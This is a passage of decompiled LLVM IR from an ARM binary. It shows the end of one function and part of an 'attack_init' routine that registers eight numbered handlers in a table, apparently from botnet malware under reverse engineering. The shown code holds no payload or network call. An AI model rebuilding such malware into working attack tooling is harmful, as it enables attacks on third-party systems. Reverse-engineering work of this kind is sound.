  %v9_a2d8 = icmp eq i8 %v3_a2d4, %v3_a0e4
  store i1 %v9_a2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2d8, label %dec_label_pc_a300, label %dec_label_pc_a2e0

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a2c4, %dec_label_pc_a2ec
  %v0_a2e0 = phi i32 [ %v1_a2e0, %dec_label_pc_a2ec ], [ 0, %dec_label_pc_a2c4 ]
  %v1_a2e0 = add i32 %v0_a2e0, 1
  %v9_a2e4 = icmp eq i32 %v1_a2e0, %v3_a2b8
  store i1 %v9_a2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2e4, label %dec_label_pc_a320, label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2e0
  %v4_a2ec = mul i32 %v1_a2e0, 4
  %v5_a2ec = add i32 %v4_a2ec, %v2_a2c8
  %v6_a2ec = inttoptr i32 %v5_a2ec to i32*
  %v7_a2ec = load i32, i32* %v6_a2ec, align 4
  store i32 %v7_a2ec, i32* %ip.global-to-local, align 4
  %v1_a2f4 = add i32 %v7_a2ec, 4
  %v2_a2f4 = inttoptr i32 %v1_a2f4 to i8*
  %v3_a2f4 = load i8, i8* %v2_a2f4, align 1
  %v4_a2f4 = zext i8 %v3_a2f4 to i32
  store i32 %v4_a2f4, i32* %r3.global-to-local, align 4
  %v9_a2f8 = icmp eq i8 %v3_a2f4, %v3_a0e4
  store i1 %v9_a2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2f8, label %dec_label_pc_a300, label %dec_label_pc_a2e0

dec_label_pc_a300:                                ; preds = %dec_label_pc_a2ec, %dec_label_pc_a2c4
  %v0_a314 = phi i32 [ %v2_a2cc, %dec_label_pc_a2c4 ], [ %v7_a2ec, %dec_label_pc_a2ec ]
  store i32 %v5_a0d4, i32* %r0.global-to-local, align 4
  %v0_a308 = load i32, i32* @sb, align 4
  store i32 %v0_a308, i32* %r1.global-to-local, align 4
  %v0_a310 = load i32, i32* @r5, align 4
  store i32 %v0_a310, i32* %r3.global-to-local, align 4
  %v1_a314 = inttoptr i32 %v0_a314 to i32*
  %v2_a314 = load i32, i32* %v1_a314, align 4
  store i32 %v2_a314, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_a314)
  br label %dec_label_pc_a320

dec_label_pc_a320:                                ; preds = %dec_label_pc_a2e0, %dec_label_pc_a2b4, %dec_label_pc_a300
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_a324 = call i32 @__GI_exit(i32 0)
  store i32 %v1_a324, i32* %r0.global-to-local, align 4
  %v0_a328 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a328, label %bb54, label %.thread17

bb54:                                             ; preds = %dec_label_pc_a320
  br label %.thread17

.thread17:                                        ; preds = %dec_label_pc_a320, %bb54
  ret i32 %v1_a324

; uselistorder directives
  uselistorder i1 %v9_a2f8, { 1, 0 }
  uselistorder i32 %v1_a2e0, { 1, 2, 0 }
  uselistorder i1 %v9_a2d8, { 1, 0 }
  uselistorder i32 %v0_a2ac, { 1, 0 }
  uselistorder i32 %v1_a29c, { 1, 2, 0 }
  uselistorder i1 %v2_a270, { 0, 2, 1 }
  uselistorder i1 %v2_a264, { 1, 0 }
  uselistorder i1 %v7_a24c, { 1, 0 }
  uselistorder i32 %v0_a248, { 2, 1, 0, 3 }
  uselistorder i32 %v0_a234, { 1, 0 }
  uselistorder i32 %v2_a204, { 1, 0 }
  uselistorder i32 %v1_a200, { 2, 0, 1, 3 }
  uselistorder i32 %v4_a1fc, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a1e0, { 1, 0 }
  uselistorder i32 %v3_a174, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a164, { 1, 0 }
  uselistorder i32 %v1_a160, { 1, 0 }
  uselistorder i32 %v2_a120, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_a0f4, { 1, 0, 2, 3 }
  uselistorder i32 %v5_a0d4, { 1, 0 }
  uselistorder i32 %v1_a0c0, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_a0bc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_a0a8, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 6, 7, 3, 4, 5, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 8, 6, 19, 7, 9, 10, 11, 13, 12, 20, 21, 14, 15, 16, 17, 18, 22, 23, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 0, 12, 17, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %dec_label_pc_a320, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a2e0, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %dec_label_pc_a26c, { 5, 4, 0, 1, 2, 3, 6, 7, 8 }
  uselistorder label %dec_label_pc_a214, { 1, 0 }
  uselistorder label %dec_label_pc_a0b0, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_a330 = load i32, i32* @r4, align 4
  store i32 %v3_a330, i32* %stack_var_-24, align 4
  %v6_a330 = load i32, i32* @r5, align 4
  %v9_a330 = load i32, i32* @r6, align 4
  %v12_a330 = load i32, i32* @r7, align 4
  %v15_a330 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a33c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_23594.66 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23598.68 to i32), i32* @r6, align 4
  store i32 52348, i32* %r2.global-to-local, align 4
  store i32 %v2_a33c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_23595.72 to i32), i32* %r1.global-to-local, align 4
  %v2_a35c = load i32, i32* @global_var_23598.68, align 4
  %v2_a360 = inttoptr i32 %v2_a33c to i32*
  store i32 52348, i32* %v2_a360, align 4
  %v3_a364 = load i32, i32* @r4, align 4
  %v4_a364 = add i32 %v3_a364, 4
  %v5_a364 = inttoptr i32 %v4_a364 to i8*
  store i8 0, i8* %v5_a364, align 1
  %v0_a368 = load i32, i32* %r1.global-to-local, align 4
  %v3_a368 = mul i32 %v0_a368, 4
  store i32 %v3_a368, i32* %r1.global-to-local, align 4
  %v5_a36c = inttoptr i32 %v2_a35c to i32*
  %v6_a36c = call i32 @realloc(i32* %v5_a36c, i32 %v3_a368, i32 52348, i32 0)
  %v2_a370 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a370 = zext i8 %v2_a370 to i32
  store i32 %v6_a36c, i32* %r2.global-to-local, align 4
  %v0_a378 = load i32, i32* @r4, align 4
  %v5_a378 = mul nuw nsw i32 %v3_a370, 4
  %v6_a378 = add i32 %v5_a378, %v6_a36c
  %v7_a378 = inttoptr i32 %v6_a378 to i32*
  store i32 %v0_a378, i32* %v7_a378, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_23595.72 to i32), i32* %r3.global-to-local, align 4
  %v1_a388 = load i32, i32* @r6, align 4
  %v2_a388 = inttoptr i32 %v1_a388 to i32*
  store i32 %v6_a36c, i32* %v2_a388, align 4
  %v0_a38c = load i32, i32* %r3.global-to-local, align 4
  %v1_a38c = trunc i32 %v0_a38c to i8
  %v2_a38c = load i32, i32* @r5, align 4
  %v3_a38c = inttoptr i32 %v2_a38c to i8*
  store i8 %v1_a38c, i8* %v3_a38c, align 1
  %v2_a390 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_d248.74 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_a390, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_23595.72 to i32), i32* %r1.global-to-local, align 4
  %v2_a3a8 = load i32, i32* @global_var_23598.68, align 4
  %v2_a3ac = inttoptr i32 %v2_a390 to i32*
  store i32 ptrtoint (i32* @global_var_d248.74 to i32), i32* %v2_a3ac, align 4
  %v0_a3b0 = load i32, i32* @r8, align 4
  %v1_a3b0 = trunc i32 %v0_a3b0 to i8
  %v2_a3b0 = load i32, i32* @r4, align 4
  %v3_a3b0 = add i32 %v2_a3b0, 4
  %v4_a3b0 = inttoptr i32 %v3_a3b0 to i8*
  store i8 %v1_a3b0, i8* %v4_a3b0, align 1
  %v0_a3b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a3b4 = mul i32 %v0_a3b4, 4
  store i32 %v3_a3b4, i32* %r1.global-to-local, align 4
  %v4_a3b8 = inttoptr i32 %v2_a3a8 to i32*
  %v5_a3b8 = call i32 @realloc(i32* %v4_a3b8, i32 %v3_a3b4, i32 %v6_a36c, i32 ptrtoint (i32* @global_var_d248.74 to i32))
  %v2_a3bc = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a3bc = zext i8 %v2_a3bc to i32
  store i32 %v3_a3bc, i32* %r3.global-to-local, align 4
  store i32 %v5_a3b8, i32* %r2.global-to-local, align 4
  %v0_a3c4 = load i32, i32* @r4, align 4
  %v5_a3c4 = mul nuw nsw i32 %v3_a3bc, 4
  %v6_a3c4 = add i32 %v5_a3c4, %v5_a3b8
  %v7_a3c4 = inttoptr i32 %v6_a3c4 to i32*
  store i32 %v0_a3c4, i32* %v7_a3c4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a3cc = load i32, i32* %r3.global-to-local, align 4
  %v1_a3cc = load i32, i32* @r8, align 4
  %v2_a3cc = add i32 %v1_a3cc, %v0_a3cc
  store i32 %v2_a3cc, i32* %r3.global-to-local, align 4
  %v1_a3d4 = trunc i32 %v2_a3cc to i8
  %v2_a3d4 = load i32, i32* @r5, align 4
  %v3_a3d4 = inttoptr i32 %v2_a3d4 to i8*
  store i8 %v1_a3d4, i8* %v3_a3d4, align 1
  %v0_a3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d8 = load i32, i32* @r6, align 4
  %v2_a3d8 = inttoptr i32 %v1_a3d8 to i32*
  store i32 %v0_a3d8, i32* %v2_a3d8, align 4
  %v2_a3dc = call i32 @calloc(i32 %v1_a3cc, i32 8)
  %v2_a3e0 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a3e0 = zext i8 %v2_a3e0 to i32
  store i32 ptrtoint (i32* @global_var_d6b4.76 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a3dc, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_a3f0 = load i32, i32* @r8, align 4
  %v2_a3f0 = add i32 %v1_a3f0, %v3_a3e0
  store i32 %v2_a3f0, i32* %r1.global-to-local, align 4
  %v2_a3f4 = load i32, i32* @global_var_23598.68, align 4
  %v2_a3f8 = inttoptr i32 %v2_a3dc to i32*
  store i32 ptrtoint (i32* @global_var_d6b4.76 to i32), i32* %v2_a3f8, align 4
  %v3_a3fc = load i32, i32* @r4, align 4
  %v4_a3fc = add i32 %v3_a3fc, 4
  %v5_a3fc = inttoptr i32 %v4_a3fc to i8*
  store i8 2, i8* %v5_a3fc, align 1
  %v0_a400 = load i32, i32* %r1.global-to-local, align 4
  %v3_a400 = mul i32 %v0_a400, 4
  store i32 %v3_a400, i32* %r1.global-to-local, align 4
  %v5_a404 = inttoptr i32 %v2_a3f4 to i32*
  %v6_a404 = call i32 @realloc(i32* %v5_a404, i32 %v3_a400, i32 ptrtoint (i32* @global_var_d6b4.76 to i32), i32 2)
  %v2_a408 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a408 = zext i8 %v2_a408 to i32
  store i32 %v3_a408, i32* %r3.global-to-local, align 4
  store i32 %v6_a404, i32* %r2.global-to-local, align 4
  %v0_a410 = load i32, i32* @r4, align 4
  %v5_a410 = mul nuw nsw i32 %v3_a408, 4
  %v6_a410 = add i32 %v5_a410, %v6_a404
  %v7_a410 = inttoptr i32 %v6_a410 to i32*
  store i32 %v0_a410, i32* %v7_a410, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a418 = load i32, i32* %r3.global-to-local, align 4
  %v1_a418 = load i32, i32* @r8, align 4
  %v2_a418 = add i32 %v1_a418, %v0_a418
  store i32 %v2_a418, i32* %r3.global-to-local, align 4
  %v1_a420 = load i32, i32* @r6, align 4
  %v2_a420 = inttoptr i32 %v1_a420 to i32*
  store i32 %v6_a404, i32* %v2_a420, align 4
  %v0_a424 = load i32, i32* %r3.global-to-local, align 4
  %v1_a424 = trunc i32 %v0_a424 to i8
  %v2_a424 = load i32, i32* @r5, align 4
  %v3_a424 = inttoptr i32 %v2_a424 to i8*
  store i8 %v1_a424, i8* %v3_a424, align 1
  %v2_a428 = call i32 @calloc(i32 %v1_a418, i32 8)
  %v2_a42c = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a42c = zext i8 %v2_a42c to i32
  store i32 ptrtoint (i32* @global_var_c9bc.78 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_a428, i32* @r4, align 4
  %v1_a43c = load i32, i32* @r8, align 4
  %v2_a43c = add i32 %v1_a43c, %v3_a42c
  store i32 %v2_a43c, i32* %r1.global-to-local, align 4
  %v2_a440 = load i32, i32* @global_var_23598.68, align 4
  %v2_a444 = inttoptr i32 %v2_a428 to i32*
  store i32 ptrtoint (i32* @global_var_c9bc.78 to i32), i32* %v2_a444, align 4
  %v0_a448 = load i32, i32* @r7, align 4
  %v1_a448 = trunc i32 %v0_a448 to i8
  %v2_a448 = load i32, i32* @r4, align 4
  %v3_a448 = add i32 %v2_a448, 4
  %v4_a448 = inttoptr i32 %v3_a448 to i8*
  store i8 %v1_a448, i8* %v4_a448, align 1
  %v0_a44c = load i32, i32* %r1.global-to-local, align 4
  %v3_a44c = mul i32 %v0_a44c, 4
  store i32 %v3_a44c, i32* %r1.global-to-local, align 4
  %v4_a450 = inttoptr i32 %v2_a440 to i32*
  %v5_a450 = call i32 @realloc(i32* %v4_a450, i32 %v3_a44c, i32 %v6_a404, i32 ptrtoint (i32* @global_var_c9bc.78 to i32))
  %v2_a454 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a454 = zext i8 %v2_a454 to i32
  store i32 %v3_a454, i32* %r3.global-to-local, align 4
  store i32 %v5_a450, i32* %r2.global-to-local, align 4
  %v0_a45c = load i32, i32* @r4, align 4
  %v5_a45c = mul nuw nsw i32 %v3_a454, 4
  %v6_a45c = add i32 %v5_a45c, %v5_a450
  %v7_a45c = inttoptr i32 %v6_a45c to i32*
  store i32 %v0_a45c, i32* %v7_a45c, align 4
  %v0_a460 = load i32, i32* @r7, align 4
  store i32 %v0_a460, i32* %r1.global-to-local, align 4
  %v0_a464 = load i32, i32* %r3.global-to-local, align 4
  %v1_a464 = load i32, i32* @r8, align 4
  %v2_a464 = add i32 %v1_a464, %v0_a464
  store i32 %v2_a464, i32* %r3.global-to-local, align 4
  %v1_a46c = trunc i32 %v2_a464 to i8
  %v2_a46c = load i32, i32* @r5, align 4
  %v3_a46c = inttoptr i32 %v2_a46c to i8*
  store i8 %v1_a46c, i8* %v3_a46c, align 1
  %v0_a470 = load i32, i32* %r2.global-to-local, align 4
  %v1_a470 = load i32, i32* @r6, align 4
  %v2_a470 = inttoptr i32 %v1_a470 to i32*
  store i32 %v0_a470, i32* %v2_a470, align 4
  %v2_a474 = call i32 @calloc(i32 %v1_a464, i32 %v0_a460)
  %v2_a478 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a478 = zext i8 %v2_a478 to i32
  store i32 ptrtoint (i32* @global_var_c2e4.80 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a474, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_a488 = load i32, i32* @r8, align 4
  %v2_a488 = add i32 %v1_a488, %v3_a478
  store i32 %v2_a488, i32* %r1.global-to-local, align 4
  %v2_a48c = load i32, i32* @global_var_23598.68, align 4
  %v2_a490 = inttoptr i32 %v2_a474 to i32*
  store i32 ptrtoint (i32* @global_var_c2e4.80 to i32), i32* %v2_a490, align 4
  %v3_a494 = load i32, i32* @r4, align 4
  %v4_a494 = add i32 %v3_a494, 4
  %v5_a494 = inttoptr i32 %v4_a494 to i8*
  store i8 3, i8* %v5_a494, align 1
  %v0_a498 = load i32, i32* %r1.global-to-local, align 4
  %v3_a498 = mul i32 %v0_a498, 4
  store i32 %v3_a498, i32* %r1.global-to-local, align 4
  %v5_a49c = inttoptr i32 %v2_a48c to i32*
  %v6_a49c = call i32 @realloc(i32* %v5_a49c, i32 %v3_a498, i32 ptrtoint (i32* @global_var_c2e4.80 to i32), i32 3)
  %v2_a4a0 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a4a0 = zext i8 %v2_a4a0 to i32
  store i32 %v3_a4a0, i32* %r3.global-to-local, align 4
  store i32 %v6_a49c, i32* %r2.global-to-local, align 4
  %v0_a4a8 = load i32, i32* @r4, align 4
  %v5_a4a8 = mul nuw nsw i32 %v3_a4a0, 4
  %v6_a4a8 = add i32 %v5_a4a8, %v6_a49c
  %v7_a4a8 = inttoptr i32 %v6_a4a8 to i32*
  store i32 %v0_a4a8, i32* %v7_a4a8, align 4
  %v0_a4ac = load i32, i32* @r7, align 4
  store i32 %v0_a4ac, i32* %r1.global-to-local, align 4
  %v0_a4b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a4b0 = load i32, i32* @r8, align 4
  %v2_a4b0 = add i32 %v1_a4b0, %v0_a4b0
  store i32 %v2_a4b0, i32* %r3.global-to-local, align 4
  %v1_a4b8 = trunc i32 %v2_a4b0 to i8
  %v2_a4b8 = load i32, i32* @r5, align 4
  %v3_a4b8 = inttoptr i32 %v2_a4b8 to i8*
  store i8 %v1_a4b8, i8* %v3_a4b8, align 1
  %v0_a4bc = load i32, i32* %r2.global-to-local, align 4
  %v1_a4bc = load i32, i32* @r6, align 4
  %v2_a4bc = inttoptr i32 %v1_a4bc to i32*
  store i32 %v0_a4bc, i32* %v2_a4bc, align 4
  %v2_a4c0 = call i32 @calloc(i32 %v1_a4b0, i32 %v0_a4ac)
  %v2_a4c4 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a4c4 = zext i8 %v2_a4c4 to i32
  store i32 ptrtoint (i32* @global_var_bbc0.82 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a4c0, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_a4d4 = load i32, i32* @r8, align 4
  %v2_a4d4 = add i32 %v1_a4d4, %v3_a4c4
  store i32 %v2_a4d4, i32* %r1.global-to-local, align 4
  %v2_a4d8 = load i32, i32* @global_var_23598.68, align 4
  %v2_a4dc = inttoptr i32 %v2_a4c0 to i32*
  store i32 ptrtoint (i32* @global_var_bbc0.82 to i32), i32* %v2_a4dc, align 4
  %v3_a4e0 = load i32, i32* @r4, align 4
  %v4_a4e0 = add i32 %v3_a4e0, 4
  %v5_a4e0 = inttoptr i32 %v4_a4e0 to i8*
  store i8 4, i8* %v5_a4e0, align 1
  %v0_a4e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a4e4 = mul i32 %v0_a4e4, 4
  store i32 %v3_a4e4, i32* %r1.global-to-local, align 4
  %v5_a4e8 = inttoptr i32 %v2_a4d8 to i32*
  %v6_a4e8 = call i32 @realloc(i32* %v5_a4e8, i32 %v3_a4e4, i32 ptrtoint (i32* @global_var_bbc0.82 to i32), i32 4)
  %v2_a4ec = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a4ec = zext i8 %v2_a4ec to i32
  store i32 %v3_a4ec, i32* %r3.global-to-local, align 4
  store i32 %v6_a4e8, i32* %r2.global-to-local, align 4
  %v0_a4f4 = load i32, i32* @r4, align 4
  %v5_a4f4 = mul nuw nsw i32 %v3_a4ec, 4
  %v6_a4f4 = add i32 %v5_a4f4, %v6_a4e8
  %v7_a4f4 = inttoptr i32 %v6_a4f4 to i32*
  store i32 %v0_a4f4, i32* %v7_a4f4, align 4
  %v0_a4f8 = load i32, i32* @r7, align 4
  store i32 %v0_a4f8, i32* %r1.global-to-local, align 4
  %v0_a4fc = load i32, i32* %r3.global-to-local, align 4
  %v1_a4fc = load i32, i32* @r8, align 4
  %v2_a4fc = add i32 %v1_a4fc, %v0_a4fc
  store i32 %v2_a4fc, i32* %r3.global-to-local, align 4
  %v1_a504 = trunc i32 %v2_a4fc to i8
  %v2_a504 = load i32, i32* @r5, align 4
  %v3_a504 = inttoptr i32 %v2_a504 to i8*
  store i8 %v1_a504, i8* %v3_a504, align 1
  %v0_a508 = load i32, i32* %r2.global-to-local, align 4
  %v1_a508 = load i32, i32* @r6, align 4
  %v2_a508 = inttoptr i32 %v1_a508 to i32*
  store i32 %v0_a508, i32* %v2_a508, align 4
  %v2_a50c = call i32 @calloc(i32 %v1_a4fc, i32 %v0_a4f8)
  %v2_a510 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a510 = zext i8 %v2_a510 to i32
  store i32 ptrtoint (i32* @global_var_b394.84 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a50c, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_a520 = load i32, i32* @r8, align 4
  %v2_a520 = add i32 %v1_a520, %v3_a510
  store i32 %v2_a520, i32* %r1.global-to-local, align 4
  %v2_a524 = load i32, i32* @global_var_23598.68, align 4
  %v2_a528 = inttoptr i32 %v2_a50c to i32*
  store i32 ptrtoint (i32* @global_var_b394.84 to i32), i32* %v2_a528, align 4
  %v3_a52c = load i32, i32* @r4, align 4
  %v4_a52c = add i32 %v3_a52c, 4
  %v5_a52c = inttoptr i32 %v4_a52c to i8*
  store i8 5, i8* %v5_a52c, align 1
  %v0_a530 = load i32, i32* %r1.global-to-local, align 4
  %v3_a530 = mul i32 %v0_a530, 4
  store i32 %v3_a530, i32* %r1.global-to-local, align 4
  %v5_a534 = inttoptr i32 %v2_a524 to i32*
  %v6_a534 = call i32 @realloc(i32* %v5_a534, i32 %v3_a530, i32 ptrtoint (i32* @global_var_b394.84 to i32), i32 5)
  %v2_a538 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a538 = zext i8 %v2_a538 to i32
  store i32 %v3_a538, i32* %r3.global-to-local, align 4
  store i32 %v6_a534, i32* %r2.global-to-local, align 4
  %v0_a540 = load i32, i32* @r4, align 4
  %v5_a540 = mul nuw nsw i32 %v3_a538, 4
  %v6_a540 = add i32 %v5_a540, %v6_a534
  %v7_a540 = inttoptr i32 %v6_a540 to i32*
  store i32 %v0_a540, i32* %v7_a540, align 4
  %v0_a544 = load i32, i32* @r7, align 4
  store i32 %v0_a544, i32* %r1.global-to-local, align 4
  %v0_a548 = load i32, i32* %r3.global-to-local, align 4
  %v1_a548 = load i32, i32* @r8, align 4
  %v2_a548 = add i32 %v1_a548, %v0_a548
  store i32 %v2_a548, i32* %r3.global-to-local, align 4
  %v1_a550 = trunc i32 %v2_a548 to i8
  %v2_a550 = load i32, i32* @r5, align 4
  %v3_a550 = inttoptr i32 %v2_a550 to i8*
  store i8 %v1_a550, i8* %v3_a550, align 1
  %v0_a554 = load i32, i32* %r2.global-to-local, align 4
  %v1_a554 = load i32, i32* @r6, align 4
  %v2_a554 = inttoptr i32 %v1_a554 to i32*
  store i32 %v0_a554, i32* %v2_a554, align 4
  %v2_a558 = call i32 @calloc(i32 %v1_a548, i32 %v0_a544)
  %v2_a55c = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a55c = zext i8 %v2_a55c to i32
  store i32 ptrtoint (i32* @global_var_ad34.86 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a558, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_a56c = load i32, i32* @r8, align 4
  %v2_a56c = add i32 %v1_a56c, %v3_a55c
  store i32 %v2_a56c, i32* %r1.global-to-local, align 4
  %v2_a570 = load i32, i32* @global_var_23598.68, align 4
  %v2_a574 = inttoptr i32 %v2_a558 to i32*
  store i32 ptrtoint (i32* @global_var_ad34.86 to i32), i32* %v2_a574, align 4
  %v3_a578 = load i32, i32* @r4, align 4
  %v4_a578 = add i32 %v3_a578, 4
  %v5_a578 = inttoptr i32 %v4_a578 to i8*
  store i8 6, i8* %v5_a578, align 1
  %v0_a57c = load i32, i32* %r1.global-to-local, align 4
  %v3_a57c = mul i32 %v0_a57c, 4
  store i32 %v3_a57c, i32* %r1.global-to-local, align 4
  %v5_a580 = inttoptr i32 %v2_a570 to i32*
  %v6_a580 = call i32 @realloc(i32* %v5_a580, i32 %v3_a57c, i32 ptrtoint (i32* @global_var_ad34.86 to i32), i32 6)
  %v2_a584 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a584 = zext i8 %v2_a584 to i32
  store i32 %v3_a584, i32* %r3.global-to-local, align 4
  store i32 %v6_a580, i32* %r2.global-to-local, align 4
  %v0_a58c = load i32, i32* @r4, align 4
  %v5_a58c = mul nuw nsw i32 %v3_a584, 4
  %v6_a58c = add i32 %v5_a58c, %v6_a580
  %v7_a58c = inttoptr i32 %v6_a58c to i32*
  store i32 %v0_a58c, i32* %v7_a58c, align 4
  %v0_a590 = load i32, i32* @r7, align 4
  store i32 %v0_a590, i32* %r1.global-to-local, align 4
  %v0_a594 = load i32, i32* %r3.global-to-local, align 4
  %v1_a594 = load i32, i32* @r8, align 4
  %v2_a594 = add i32 %v1_a594, %v0_a594
  store i32 %v2_a594, i32* %r3.global-to-local, align 4
  %v1_a59c = trunc i32 %v2_a594 to i8
  %v2_a59c = load i32, i32* @r5, align 4
  %v3_a59c = inttoptr i32 %v2_a59c to i8*
  store i8 %v1_a59c, i8* %v3_a59c, align 1
  %v0_a5a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a5a0 = load i32, i32* @r6, align 4
  %v2_a5a0 = inttoptr i32 %v1_a5a0 to i32*
  store i32 %v0_a5a0, i32* %v2_a5a0, align 4
  %v2_a5a4 = call i32 @calloc(i32 %v1_a594, i32 %v0_a590)
  %v2_a5a8 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a5a8 = zext i8 %v2_a5a8 to i32
  store i32 ptrtoint (i32* @global_var_a66c.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5a4, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_a5b8 = load i32, i32* @r8, align 4
  %v2_a5b8 = add i32 %v1_a5b8, %v3_a5a8
  store i32 %v2_a5b8, i32* %r1.global-to-local, align 4
  %v2_a5bc = load i32, i32* @global_var_23598.68, align 4
  %v2_a5c0 = inttoptr i32 %v2_a5a4 to i32*
  store i32 ptrtoint (i32* @global_var_a66c.88 to i32), i32* %v2_a5c0, align 4
  %v3_a5c4 = load i32, i32* @r4, align 4
  %v4_a5c4 = add i32 %v3_a5c4, 4
  %v5_a5c4 = inttoptr i32 %v4_a5c4 to i8*
  store i8 7, i8* %v5_a5c4, align 1
  %v0_a5c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a5c8 = mul i32 %v0_a5c8, 4
  store i32 %v3_a5c8, i32* %r1.global-to-local, align 4
  %v5_a5cc = inttoptr i32 %v2_a5bc to i32*
  %v6_a5cc = call i32 @realloc(i32* %v5_a5cc, i32 %v3_a5c8, i32 ptrtoint (i32* @global_var_a66c.88 to i32), i32 7)
  %v2_a5d0 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a5d0 = zext i8 %v2_a5d0 to i32
  store i32 %v3_a5d0, i32* %r3.global-to-local, align 4
  store i32 %v6_a5cc, i32* %r2.global-to-local, align 4
  %v0_a5d8 = load i32, i32* @r4, align 4
  %v5_a5d8 = mul nuw nsw i32 %v3_a5d0, 4
  %v6_a5d8 = add i32 %v5_a5d8, %v6_a5cc
  %v7_a5d8 = inttoptr i32 %v6_a5d8 to i32*
  store i32 %v0_a5d8, i32* %v7_a5d8, align 4
  %v0_a5dc = load i32, i32* @r7, align 4
  store i32 %v0_a5dc, i32* %r1.global-to-local, align 4
  %v0_a5e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5e0 = load i32, i32* @r8, align 4
  %v2_a5e0 = add i32 %v1_a5e0, %v0_a5e0
  store i32 %v2_a5e0, i32* %r3.global-to-local, align 4
  %v1_a5e8 = trunc i32 %v2_a5e0 to i8
  %v2_a5e8 = load i32, i32* @r5, align 4
  %v3_a5e8 = inttoptr i32 %v2_a5e8 to i8*
  store i8 %v1_a5e8, i8* %v3_a5e8, align 1
  %v0_a5ec = load i32, i32* %r2.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r6, align 4
  %v2_a5ec = inttoptr i32 %v1_a5ec to i32*
  store i32 %v0_a5ec, i32* %v2_a5ec, align 4
  %v2_a5f0 = call i32 @calloc(i32 %v1_a5e0, i32 %v0_a5dc)
